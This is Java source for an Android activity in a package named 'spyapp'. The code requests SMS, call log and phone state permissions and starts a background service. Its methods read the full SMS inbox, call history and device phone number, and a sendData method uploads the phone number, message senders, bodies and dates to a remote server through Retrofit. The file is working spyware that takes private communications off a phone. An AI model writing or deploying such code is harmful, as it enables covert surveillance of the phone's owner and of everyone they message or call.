package com.example.spyapp;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.Toast;

import com.google.gson.JsonObject;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    String phoneNo = "";

    ArrayList<String> smsList;

    ArrayList<String> callDetailList;

    ArrayList<String> callingNoList, callingDurList, callingTypeList, callingDateList, smsNoList, messageList, smsDateList;
    String callingNo, callingDur, callingType, callingDate, smsNo, message, smsDate;

   String currentTime = "";

    ListView listView;

    SimpleDateFormat simpleDateFormat ;

    Intent in;
    static Activity activity;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        activity = MainActivity.this;


        listView = findViewById(R.id.listView);

//        simpleDateFormat = new SimpleDateFormat("d-MM-yyyy   hh:mm:ss a", Locale.US);
//        currentTime = simpleDateFormat.format(Calendar.getInstance().getTime());

        in = new Intent(MainActivity.this, MyService.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getPermission();
        }

        //--------------------------------------------------------
        Button myButton = findViewById(R.id.myButton);
        myButton.setVisibility(View.VISIBLE); // Show the button when the app opens


        myButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
//                sendData(...); // Call your sendData() method here
            }
        });

    }

//    public static Activity getActivity()
//    {
//        return activity;
//    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void getPermission() {
        int smsPermission = ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.READ_SMS);
        int smsReceivePermission = ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECEIVE_SMS);
        int callLogPermission = ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.READ_CALL_LOG);
        int writeCallLogPermission = ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.WRITE_CALL_LOG);
        int phoneNoPermission = ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.READ_PHONE_NUMBERS);
        int phoneStatPermission = ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.READ_PHONE_STATE);

        if (smsPermission == PackageManager.PERMISSION_GRANTED && smsReceivePermission == PackageManager.PERMISSION_GRANTED && callLogPermission == PackageManager.PERMISSION_GRANTED && writeCallLogPermission == PackageManager.PERMISSION_GRANTED && phoneNoPermission == PackageManager.PERMISSION_GRANTED && phoneStatPermission == PackageManager.PERMISSION_GRANTED)
        {
//            getPhoneNo();
//            getSms();
//            getCallDetails();
//            sendData();
            startService(in);
        }
        else {
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{android.Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS, android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.WRITE_CALL_LOG, android.Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_PHONE_STATE}, 100);
        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 100)
        {
//            getPhoneNo();
//            getSms();
//            getCallDetails();
//            sendData();
            startService(in);

        }
    }

    @SuppressLint("HardwareIds")
    private void getPhoneNo() {
        try {
            TelephonyManager tMgr = (TelephonyManager) MainActivity.this.getSystemService(Context.TELEPHONY_SERVICE);
            phoneNo = tMgr.getLine1Number();

        //    Toast.makeText(this, phoneNo, Toast.LENGTH_SHORT).show();
        }catch (SecurityException e)
        {
            Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
        }
    }

    public void getSms() {
        Uri inboxUri = Uri.parse("content://sms/inbox");
        smsList = new ArrayList<>();

        smsNoList = new ArrayList<>();
        messageList = new ArrayList<>();
        smsDateList = new ArrayList<>();
        ContentResolver contentResolver = getContentResolver();

        Cursor cursor = contentResolver.query(inboxUri, null, null, null, null);
        while (cursor.moveToNext()) {
            String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
            String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
            String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
            Date dateFormat= new Date(Long.parseLong(date));
            String dateTime =simpleDateFormat.format(dateFormat);
            smsList.add("\n"+"number : "+number+ "\n\n"+"Message : "+body+"\n\n" +"Date : "+dateTime+"\n");

            smsNoList.add(number);
            messageList.add(body);
            smsDateList.add(dateTime);
        }

        cursor.close();
        ArrayAdapter<String> adapter = new ArrayAdapter<>(MainActivity.this, android.R.layout.simple_list_item_1, smsList);
        listView.setAdapter(adapter);

        JSONArray jsonArray =new JSONArray(smsNoList);
        smsNo = jsonArray.toString();

        JSONArray jsonArray2 =new JSONArray(messageList);
        message = jsonArray2.toString();

        JSONArray jsonArray3 =new JSONArray(smsDateList);
        smsDate = jsonArray3.toString();

    }

    @SuppressLint("DefaultLocale")
    private void getCallDetails() {

        callDetailList = new ArrayList<>();

        callingNoList = new ArrayList<>();
        callingTypeList = new ArrayList<>();
        callingDurList = new ArrayList<>();
        callingDateList = new ArrayList<>();

        int hours, minutes, seconds;
        String callDuration;

        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.parseLong(callDate));
            String dateTime =simpleDateFormat.format(callDayTime);
            String responseCallDuration = managedCursor.getString(duration);
            int totalSecs = Integer.parseInt(responseCallDuration);
            hours = totalSecs / 3600;
            minutes = (totalSecs % 3600) / 60;
            seconds = totalSecs % 60;

            callDuration = String.format("%02d:%02d:%02d", hours, minutes, seconds);
            String dir = null;
            int dirCode = Integer.parseInt(callType);
            switch (dirCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            callDetailList.add("\nPhone Number : "+phNumber+ "\nCall Type : "+dir+"\nDate : "+dateTime+"\nDuration : "+callDuration+"\n");

            callingNoList.add(phNumber);
            callingTypeList.add(dir);
            callingDurList.add(callDuration);
            callingDateList.add(dateTime);

        }
        managedCursor.close();
        ArrayAdapter<String> adapter = new ArrayAdapter<>(MainActivity.this, android.R.layout.simple_list_item_1, callDetailList);
        listView.setAdapter(adapter);

        JSONArray jsonArray =new JSONArray(callingNoList);
        callingNo = jsonArray.toString();

        JSONArray jsonArray2 =new JSONArray(callingTypeList);
        callingType = jsonArray2.toString();

//        try {
//            JSONArray jsonArray1 = new JSONArray(callingType);
//            for (int i = 0; i<jsonArray1.length(); i++)
//            {
//                Toast.makeText(this, jsonArray1.getString(i), Toast.LENGTH_SHORT).show();
//            }
//        } catch (JSONException e) {
//            throw new RuntimeException(e);
//        }

        JSONArray jsonArray3 =new JSONArray(callingDurList);
        callingDur = jsonArray3.toString();

        JSONArray jsonArray4 =new JSONArray(callingDateList);
        callingDate = jsonArray4.toString();

//        Toast.makeText(this, callingNo, Toast.LENGTH_SHORT).show();

    }

    public static void sendData(String phoneNo, String currentTime, String callingNo, String callingDate, String callingType, String callingDur, String smsNo, String message, String smsDate){


        Log.e("SendData", "phoneNo: " + phoneNo);
        Log.e("SendData", "smsNo: " + smsNo);
        Log.e("SendData", "message: " + message);
        Log.e("SendData", "smsDate: " + smsDate);



        Call<JsonObject> call = RetrofitClient.getInstance().getInterface().sendData(phoneNo,smsNo, message, smsDate );

        call.enqueue(new Callback<JsonObject>() {
            @SuppressLint("SetTextI18n")
            @Override
            public void onResponse(@NonNull Call<JsonObject> call, @NonNull Response<JsonObject> response) {
                if (response.isSuccessful()) {
                    JSONObject jsonObject1 = null;
                    try {
                        jsonObject1 = new JSONObject(String.valueOf(response.body()));

                        String statusCode = jsonObject1.getString("statuscode");
                        Log.d("SendData", "Response: " + jsonObject1.toString());



                        if (statusCode.equalsIgnoreCase("000")) {

                         try {
                             Toast.makeText(activity, "success", Toast.LENGTH_SHORT).show();
                             //activity.finish();  /// " " this is the main activity close when it open
                         }catch (Exception e)
                         {
                           //  Toast.makeText(activity, e.toString(), Toast.LENGTH_SHORT).show();
                         }

                        }
                        else
                        {
                            try {
                                Toast.makeText(activity, "ERROR", Toast.LENGTH_SHORT).show();
                                activity.finish();
                            }catch (Exception e)
                            {
                                //  Toast.makeText(activity, e.toString(), Toast.LENGTH_SHORT).show();
                            }
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        Toast.makeText(activity, "catch", Toast.LENGTH_SHORT).show();
                        activity.finish();
                    }

                } else {
                    try {
                        Toast.makeText(activity, response.message(), Toast.LENGTH_SHORT).show();
                        activity.finish();
                    }catch (Exception e)
                    {
                        //  Toast.makeText(activity, e.toString(), Toast.LENGTH_SHORT).show();
                    }
                }
            }

            @SuppressLint("SetTextI18n")
            @Override
            public void onFailure(@NonNull Call<JsonObject> call, @NonNull Throwable t) {
                try {
                    Toast.makeText(activity, t.getMessage(), Toast.LENGTH_SHORT).show();
                    activity.finish();
                }catch (Exception e)
                {
                    //  Toast.makeText(activity, e.toString(), Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

}